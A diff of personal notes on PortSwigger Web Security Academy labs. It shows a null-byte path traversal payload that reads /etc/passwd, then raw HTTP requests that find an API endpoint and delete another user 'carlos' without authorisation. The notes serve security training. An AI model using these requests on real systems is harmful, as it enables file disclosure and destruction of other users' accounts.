@@ -1059,3 +1059,40 @@ https://0a3700b503319f0082c8ec4d00fb00cd.web-security-academy.net/image?filename
 
 5. Use null byte to bypass > if null byte is used, behind the null byte is ignored, for example .jpg > ?filename=../../../../../etc/passwd%00.jpg
 ______________________________________________________________________________________________________________________________________________________________
+API testing
+-----------------------------------------------
+1. Find the /api/.. endpoints
+that is in login page > after login > update email > 
+
+PATCH /api/user/weiner HTTP/2
+Host: 0a89009d04690a8f848968d0004d0049.web-security-academy.net
+Cookie: session=9Rg2ESwe0rWsF2s1cWuEniHGWoUyVHXP
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0
+Accept: */*
+
+{"email":"fuckyou@gmail.com"}
+
+2. Find api documentation or use OPTIONS request to know which requests are allowed.
+
+OPTIONS /api/user/weiner HTTP/2
+Host: 0a89009d04690a8f848968d0004d0049.web-security-academy.net
+Cookie: session=9Rg2ESwe0rWsF2s1cWuEniHGWoUyVHXP
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0
+Accept: */*
+
+	(or)
+
+GET /api HTTP/2   
+Host: 0a89009d04690a8f848968d0004d0049.web-security-academy.net
+Cookie: session=9Rg2ESwe0rWsF2s1cWuEniHGWoUyVHXP
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0
+Accept: */*
+
+3.DELETE carlos user 
+
+DELETE /api/user/carlos HTTP/2
+Host: 0a89009d04690a8f848968d0004d0049.web-security-academy.net
+Cookie: session=9Rg2ESwe0rWsF2s1cWuEniHGWoUyVHXP
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0
+Accept: */*
+______________________________________________________________________________________________________________________________________________________________
